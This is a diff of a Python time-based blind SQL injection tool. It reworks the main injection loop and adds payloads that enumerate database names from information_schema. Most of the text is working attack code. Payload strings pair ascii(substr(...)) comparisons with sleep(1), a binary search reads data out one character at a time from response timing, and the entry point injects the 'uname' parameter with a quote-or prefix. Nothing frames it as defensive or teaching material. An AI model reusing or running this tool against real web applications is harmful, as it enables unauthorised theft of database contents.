@@ -33,7 +33,6 @@ class File:
             fileData = f.read()
             HTTPData = HTTPRequest(fileData)
         return HTTPData
-
 class Join:
     """
     Join post data
@@ -125,16 +124,16 @@ class Mylog:
         self.logger = logging.getLogger("injectManlog")
         self.logger.setLevel(logging.INFO)
         self.Switch = Switch()
+        self.consoleHandler = ConsoleHandler()
     def addLevel(self, levelInt, levelName):
         logging.addLevelName(levelInt, levelName)
     def toLog(self, levelName, message, option):
         colorFmt = self.Switch.getValue(self.colorMap(), levelName, mainMsg = self.outFmt)
         formatter = logging.Formatter(fmt = colorFmt,datefmt = self.timeFmt)
-        consoleHandler = ConsoleHandler()
-        consoleHandler.setFormatter(formatter)
-        self.logger.addHandler(consoleHandler)
+        self.consoleHandler.setFormatter(formatter)
+        self.logger.addHandler(self.consoleHandler)
         intLevel = self.Switch.getValue(self.numMap(), levelName)
-        self.logger.log(intLevel,message + self.ENDC,extra=option)
+        self.logger.log(intLevel, message + self.ENDC, extra=option)
     def toFormat(self, basicFmt, timeFmt):
         self.outFmt = basicFmt
         self.timeFmt = timeFmt
@@ -179,25 +178,35 @@ class Inject:
         self.log.addLevel(100,"RESULT")
         self.log.toFormat("[%(asctime)s] [%(levelname)s] %(message)s","%H:%M:%S")
         self.funcSwitch = Switch()
-    def inJect(self, infDict, optionDict):
+    def injectMain(self, infDict, optionDict):
         Func = self.optTofunc(optionDict)
+        length = self.getLength(infDict, Func)
+        for pos in range(1, length + 1):
+            nameLength = self.getValue(infDict, Func , pos)
+            nameValue = ""
+            for pos2 in range(1, nameLength + 1):
+                charAscii = self.getValue(infDict, "dbName", pos, pos2)
+                nameValue = nameValue + chr(charAscii)
+                self.log.toLog("result","{} name is {}".format("dbName", nameValue),option={'same_line':True})
+        sys.stderr.write("\n")
+    def getLength(self, infDict, Func):
         lengthPoc = None
         length = self.binarySearch(infDict, Func, lengthPoc)
-        self.log.toLog("result","Current length is {}".format(length),option={'same_line':False})
-        name = ''
-        for namePos in range(1,length+1):
-            charAscii = self.binarySearch(infDict, Func, namePos)
-            name = name + chr(charAscii)
-            self.log.toLog("result","Current name is {}".format(name),option={'same_line':True})
-        sys.stderr.write('\n')
-    def binarySearch(self, infDict, Func, pos):
+        self.log.toLog("result","{} length is {}".format(Func, length),option={'same_line':False})
+        return length
+    def getValue(self , infDict, Func , pos, pos2 = None):
+        charAscii = self.binarySearch(infDict, Func, pos , pos2)
+        if not pos2:
+            self.log.toLog("result","{} name is {}".format(Func, charAscii),option={'same_line':False})
+        return charAscii 
+    def binarySearch(self, infDict, Func, pos ,pos2 = None):
         self.left = 0
         self.right = 127
         nPayload = Payload()
         self.symbol = ">"
         while self.left <= self.right:
             self.mid = int((self.left+self.right)/2)
-            infDict['payload'] = getattr(nPayload,Func)(self.symbol,self.mid,pos)       
+            infDict['payload'] = getattr(nPayload,Func)(self.symbol, self.mid, pos, pos2)       
             data = self.nJoin.joinData(infDict)
             startTime = datetime.datetime.now()
             self.nRequest.send(data)
@@ -232,7 +241,6 @@ class Inject:
         elif timeTmp < stander and self.symbol == "<":
             self.symbol = ">"
         return 0
-
     def optTofunc(self, optionDict):
         if optionDict.has_key('--dump') and optionDict['--dump']:
             returnValue = "Dump"
@@ -251,7 +259,7 @@ class Payload:
     """
     Generate payload by input flag
     """
-    def reduceTimes(self,symbol,value,pos=None):
+    def reduceTimes(self, symbol, value, pos=None):
         if not pos:
             pass
     def withoutQuoteandequal(self,symbol,value,pos=None):
@@ -262,13 +270,17 @@ class Payload:
             key = 'ascii(substring(@@version from {} for 1)){}{} and sleep(1)'
             test_Payload = key.format(pos,symbol,value)
         return test_Payload
-    def Dbs(self, symbol, value ,pos = None):
-        if not pos:
-            key = 'length((select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1))'
-        else:
-            key = 'ascii(substr((select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1),{},1))'.format(pos)
+    def dbName(self, symbol, value ,pos = None, pos2 = None):
+        key = 'ascii(substr((select SCHEMA_NAME from information_schema.SCHEMATA limit {},1),{},1))'.format(pos-1,pos2)
         currentDbs_Payload = self.basic(key, symbol ,value)
         return currentDbs_Payload
+    def Dbs(self, symbol, value, pos=None, pos2 = None):
+        if not pos:
+            key = '(select count(SCHEMA_NAME) from information_schema.SCHEMATA)'
+        else:
+            key = 'length((select SCHEMA_NAME from information_schema.SCHEMATA limit {},1))'.format(pos-1)
+        dbs_Payload = self.basic(key, symbol, value)
+        return dbs_Payload
     def currentDb(self,symbol,value,pos=None):
         if not pos:
             key = 'length((select database()))'
@@ -289,7 +301,7 @@ class Payload:
         return finalPayload
 if __name__ == "__main__":
     nInject = Inject('1.txt')
-    nInject.inJect({'param':'uname','prefix':'\' or ','suffix':' #'},{'--dbs':True,'--current-user':False,'--current-db':False})
+    nInject.injectMain({'param':'uname','prefix':'\' or ','suffix':' #'},{'--dbs':True,'--current-user':False,'--current-db':False})
     #nInject.inJect({'param':'roleId','prefix':'\' or ','suffix':' %23'},{'--current-db':True})
     #nInject.inJect({'param':'uname','prefix':'\' or ','suffix':' %23'},{'--current-db':False,'--current-user':True})
     #nInject.inJect({'param':'certificateId','prefix':'\' or ','suffix':' and \'1\'=\'1'},{'--current-db':False,'--current-user':True,'--withoutQuoteandequal':False,'--reduceTimes':False})
